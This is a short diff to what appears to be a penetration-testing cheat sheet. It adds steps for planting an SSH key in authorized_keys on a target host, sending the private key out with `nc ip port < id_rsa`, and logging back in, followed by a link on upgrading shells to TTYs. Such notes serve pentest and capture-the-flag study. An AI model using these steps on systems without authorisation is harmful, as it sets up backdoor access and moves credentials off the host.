@@ -1,3 +1,13 @@
+# SSH
+- Using .ssh/authorized_keys
+  - Create the keys: `ssh-keygen -t rsa`
+  - Copy the public to .ssh/authorized_keys: `cp id_rsa.pub ~/.ssh/authorized_keys`
+  - Change the permissions of the .ssh folder to 700: `chmod 700 ~/.ssh`
+  - Change the permissions of the .ssh/authorized_keys file to 600: `chmod 600 ~/.ssh/authorized_keys`
+  - Download the private key: `nc ip port < id_rsa`
+  - Change the permissions of the local priate key to 600: `chmod 600 id_rsa`
+  - Log in using SSH: `ssh -i id_rsa user@ip`
+
 # [Upgrading TTY](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)
 - With Python:
 ```bash
